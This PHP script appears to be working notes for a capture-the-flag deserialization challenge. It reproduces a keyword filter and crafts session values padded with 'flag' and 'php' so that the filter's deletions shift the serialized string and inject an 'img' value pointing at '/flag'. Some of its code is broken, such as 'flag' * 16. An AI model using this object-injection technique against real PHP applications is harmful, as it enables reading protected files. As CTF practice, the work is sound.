<?php
// Analyze the escape more carefully

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}

// The user value: flagflagflagflagflagflagflagflag";s:3:"img";s:20:"L2ZsYWc=";}
// Length: 61 bytes
// After filter: ";s:3:"img";s:20:"L2ZsYWc=";} (29 bytes)
// Shrink: 32 bytes (8 'flag's)

// Serialized: s:61:"flag...flag";s:3:"img";s:20:"L2ZsYWc=";}"
// After filter: s:61:"";s:3:"img";s:20:"L2ZsYWc=";}"
// 
// PHP reads 61 bytes from "" (empty).
// Content: ";s:3:"img";s:20:"L2ZsYWc=";}";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// PHP reads 61 bytes: ";s:3:"img";s:20:"L2ZsYWc=";}";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nL (61 bytes)
// 
// Then PHP expects "; (closing quote and semicolon)
// Next char: n (from "nBuZw==")
// Expected ", got n
// Error!

// We need to adjust the number of 'flag's!

// Let me calculate:
// 
// The injection is: ";s:3:"img";s:20:"L2ZsYWc=";} (29 bytes)
// 
// After the injection, the remaining content is: ";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// Length: 73 bytes
// 
// We need to consume 73 bytes to reach the end of the array!
// 
// Each 'flag' generates 4 bytes of overflow.
// 73 / 4 = 18.25, so we need 19 'flag's = 76 bytes of overflow.
// 
// But 76 > 73, so we'd read past the end of the string!

// Let me try a combination:
// 
// 73 = 4*16 + 3*3 = 64 + 9 = 73
// 
// So we need 16 'flag's + 3 'php's = 73 bytes of overflow!

$_SESSION = [];
$_SESSION['user'] = 'flag' * 16 . 'php' * 3 . '";s:3:"img";s:20:"L2ZsYWc=";}';
$_SESSION['function'] = 'show_image';
$_SESSION['img'] = base64_encode('guest_img.png');

$serialized = serialize($_SESSION);
echo "Serialized:\n";
echo $serialized . "\n\n";

$filtered = filter($serialized);
echo "Filtered:\n";
echo $filtered . "\n\n";

$result = @unserialize($filtered);
echo "Unserialized:\n";
var_dump($result);

// Let me also try with the injection that closes the array
$_SESSION = [];
$_SESSION['user'] = 'flag' * 16 . 'php' * 3 . '";s:3:"img";s:20:"L2ZsYWc=";}}';
$_SESSION['function'] = 'show_image';
$_SESSION['img'] = base64_encode('guest_img.png');

$serialized = serialize($_SESSION);
echo "\n\n=== With extra } ===\n";
echo "Serialized:\n";
echo $serialized . "\n\n";

$filtered = filter($serialized);
echo "Filtered:\n";
echo $filtered . "\n\n";

$result = @unserialize($filtered);
echo "Unserialized:\n";
var_dump($result);

